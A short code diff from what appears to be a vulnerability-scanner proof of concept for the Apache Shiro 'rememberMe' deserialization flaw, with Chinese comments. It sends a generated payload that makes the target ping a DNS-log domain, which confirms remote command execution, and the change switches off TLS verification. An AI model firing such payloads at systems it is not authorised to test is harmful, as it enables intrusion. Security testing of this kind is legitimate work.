@@ -32,7 +32,7 @@ def poc(url):
         domain = cloudeye.getRandomDomain('shiro')  # 设置dns特征域名组
         rce_command = 'ping -n 3 %s || ping -c 3 %s' % (domain, domain)  # 目标机执行的代码
         payload = generator(rce_command, JAR_FILE)  # 生成payload
-        requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10)  # 发送验证请求
+        requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10, verify=False)  # 发送验证请求
 
         dnslog = cloudeye.getDnsRecord(delay=2)
         if domain in dnslog:
